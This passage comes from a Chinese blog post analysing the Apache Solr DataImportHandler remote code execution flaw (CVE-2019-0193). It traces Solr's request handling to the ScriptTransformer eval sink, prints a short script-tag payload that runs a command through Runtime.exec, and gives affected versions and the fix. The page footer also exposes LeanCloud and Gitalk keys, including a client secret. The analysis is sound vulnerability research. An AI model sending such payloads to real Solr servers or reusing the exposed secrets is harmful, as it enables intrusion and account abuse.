+<p>继续向下看到图中542行：<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>，跟进去：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取到SolrCore，执行其<code>org.apache.solr.core.SolrCore#execute()</code>方法，该方法会调用<code>handler.handleRequest(req,rsp)</code>对req做处理：</p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p>
+<p>在<code>handler.handleRequest(req,rsp)</code>中会调用<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>方法，如果是之前能静态分析到这里，可以像Chamd5的大佬一样，搜索该类的实现，发现<code>dataimport.DataImportHandler#handleRequestBody()</code>这个方法，但是现在既然已经动态调试了，那直接跟进去就行了。</p>
+<p>至此，我们终于找到了处理该请求的入口。</p>
+<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// 获取一个SolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先会提取出request的参数，然后关键在第18-39行，如果是调试模式(requestParams.isDebug())，则同步执行importer，如果不是则异步执行，为了方便调试，可以把payload加一个<code>debug=true</code>参数，调试同步的分支：</p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p>
+<p>继续向下跟，<code>DataImporter#runCmd()</code>调用<code>DataImporter#doFullImport()</code>——因为我们参数是<code>command=full-import</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到这里大概就可以猜到问题在第9行——<code>docBuilder.execute()</code>了，导入的dataConfig时我们可以控制的，而config中可以自写js脚本，又想到Nashorn解析的js脚本能执行java命令，这就导致了本次的漏洞。</p>
+<p>跟完后续的调用栈吧，sink点在<code>ScriptTransformer#initEngine()</code>的87行——<code>ScriptEngine#eval(String)</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // 主力里面的第100-111行，如果发现script标签，则向transformers加入解析js的transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //这里的string就是之前script里的内容</span><br><span class="line">           javax.script.Invocable#invokeFunction//这里调用之前func定义的内容，产生RCE</span><br></pre></td></tr></table></figure>
+<p>值得注意的是，我们可以直接在<code>ScriptEngine#eval(String)</code>处就直接RCE，即将script直接换成如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是这样程序日志会有报错，因为invokeFunction找不到，综上本文还是选择了定义函数的payload。</p>
+<h1 id="影响范围和修复"><a href="#影响范围和修复" class="headerlink" title="影响范围和修复"></a>影响范围和修复</h1><p>此漏洞影响solr&lt;=8.1.1，对比8.2.0可以看到修复方案：</p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" alt="image-20191103202031725"></p>
+<p>即dataConfig参数必须要dataConfigParam_enabled为True时才能使用，可以在配置或启动命令中设置<code>-Denable .dih.dataConfigParam=true</code></p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>8月份的一个洞了，一直忙到现在才看，本身漏洞不复杂，但其中附加调试和找javaWeb入口点的技巧值得学习。</p>
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul>
+<li><p>CVE-2019-0193 APACHE SOLR 远程命令执行漏洞分析， <a href="https://kylingit.com/blog/cve-2019-0193-apache-solr远程命令执行漏洞分析/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p>
+</li>
+<li><p>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p>
+</li>
+<li>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析， <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/" title="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+            
+              <a href="/tags/Solr/" rel="tag"># Solr</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/vulnresearch-Solr_Velocity_injection/" rel="next" title="Solr Velocity模板注入漏洞分析">
+                  <i class="fa fa-chevron-left"></i> Solr Velocity模板注入漏洞分析
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/container-Clair初探/" rel="prev" title="Clair初探">
+                  Clair初探 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">2.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景知识"><span class="nav-number">3.1.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dataimport"><span class="nav-number">3.1.1.</span> <span class="nav-text">dataimport</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ScriptTransformer"><span class="nav-number">3.1.2.</span> <span class="nav-text">ScriptTransformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nashorn-解析"><span class="nav-number">3.1.3.</span> <span class="nav-text">Nashorn 解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#静态分析入口点"><span class="nav-number">3.2.</span> <span class="nav-text">静态分析入口点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态调试"><span class="nav-number">3.3.</span> <span class="nav-text">动态调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#找入口点"><span class="nav-number">3.3.1.</span> <span class="nav-text">找入口点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用栈"><span class="nav-number">3.3.2.</span> <span class="nav-text">调用栈</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#影响范围和修复"><span class="nav-number">4.</span> <span class="nav-text">影响范围和修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关链接"><span class="nav-number">6.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: '763e917ad31f36f74bfcf7b5bcec153a',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
